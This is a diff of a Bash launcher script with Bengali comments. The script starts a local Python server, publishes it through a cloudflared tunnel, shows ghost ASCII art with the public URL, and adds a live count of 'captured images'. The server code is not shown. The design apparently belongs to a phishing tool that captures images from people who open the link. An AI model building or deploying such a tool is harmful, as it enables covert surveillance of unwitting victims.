@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 
 # ১. পুরনো প্রসেস ও লগ পরিষ্কার করা (পোর্ট এবং পাইথন সার্ভার কিল করা)
-fuser -k 5000/tcp 2>/dev/null
+fuser -k 9030/tcp 2>/dev/null
 pkill -f "server.py" 2>/dev/null
 pkill -f "cloudflared tunnel" 2>/dev/null
 rm -f /root/tunnel.log
@@ -15,7 +15,7 @@ printf '\033[?25l'
 cleanup() {
     printf "\033[?25h\033[0m\n"
     kill "$SERVER_PID" "$TUNNEL_PID" 2>/dev/null
-    fuser -k 5000/tcp 2>/dev/null
+    fuser -k 9030/tcp 2>/dev/null
     pkill -f "server.py" 2>/dev/null
     echo -e "\033[1;31m[!] Server & Tunnel Stopped.\033[0m"
     exit 0
@@ -24,12 +24,12 @@ trap cleanup INT TERM
 
 clear 2>/dev/null || printf '\033[H\033[2J\033[3J'
 
-# ৩. ব্যাকগ্রাউন্ডে পাইথন সার্ভার (port 5000) ও ক্লাউডফ্লেয়ার টানেল চালু করা
+# ৩. ব্যাকগ্রাউন্ডে পাইথন সার্ভার (port 9030) ও ক্লাউডফ্লেয়ার টানেল চালু করা
 python3 /sdcard/Download/server.py &
 SERVER_PID=$!
 sleep 3
 
-/root/cloudflared tunnel --url http://127.0.0.1:5000 > /root/tunnel.log 2>&1 &
+/root/cloudflared tunnel --url http://127.0.0.1:9030 > /root/tunnel.log 2>&1 &
 TUNNEL_PID=$!
 
 # ৪. পাবলিক লিংক তৈরি হওয়ার জন্য অপেক্ষা করা (সর্বোচ্চ ১৫ সেকেন্ড)
@@ -45,7 +45,7 @@ done
 
 clear 2>/dev/null || printf '\033[H\033[2J\033[3J'
 
-# ৫. তোমার দেওয়া হুবহু ভূতের পরিবার আর্ট
+# ৫. ভূতের পরিবার আর্ট
 lines=()
 while IFS= read -r line; do
     lines+=("$line")
@@ -93,7 +93,6 @@ done <<'ART'
        '--'                                '--'
 ART
 
-# ভূতের ডান পাশে বসানোর জন্য বড় ব্লক-ফন্ট টেক্সট (৫ লাইন)
 banner=(
 " ##  #      #  ### ### #  # # # #"
 "#   # #    # #  #   #  # #  # # #"
@@ -104,7 +103,6 @@ banner=(
 banner_start_row=4
 pad_width=48
 
-# ---------- প্রথমে পুরো স্থির ছবিটা একবার প্রিন্ট করা (চোখ ছাড়া) ----------
 printf '\033[1;37m'
 
 eye_rows=()
@@ -142,18 +140,25 @@ printf '\033[0m'
 printf '\033[1;31m    MAA DAKINI                              MAA YOGINI\033[0m\n'
 printf '\033[1;37m===========================================================\033[0m\n'
 
-# ৬. নিচে লাইভ পাবলিক লিংক প্রদর্শন
 if [ -n "$URL" ]; then
     printf '\033[1;32m [+] LIVE PUBLIC URL : \033[1;33m%s\033[0m\n' "$URL"
 else
     printf '\033[1;31m [-] ERROR: Tunnel connection failed! Check internet.\033[0m\n'
 fi
 printf '\033[1;37m===========================================================\033[0m\n'
+printf '\033[1;36m [+] CAPTURED IMAGES : \033[1;33mCounting live from folder...\033[0m\n'
+printf '\033[1;37m===========================================================\033[0m\n'
 printf '\033[1;30m   (বন্ধ করতে Ctrl+C চাপুন)\033[0m\n'
 
-# ---------- এখন শুধু চোখ লাল <-> অন্ধকার, অসীম লুপে ----------
 on=1
 while true; do
+    count=$(ls -1 /root/captured_images/ 2>/dev/null | wc -l)
+
+    printf '\033[s'
+    printf '\033[21;25H'
+    printf '\033[1;33m%3d Files\033[0m' "$count"
+    printf '\033[u'
+
     for i in "${!eye_rows[@]}"; do
         r="${eye_rows[$i]}"
         c="${eye_cols[$i]}"
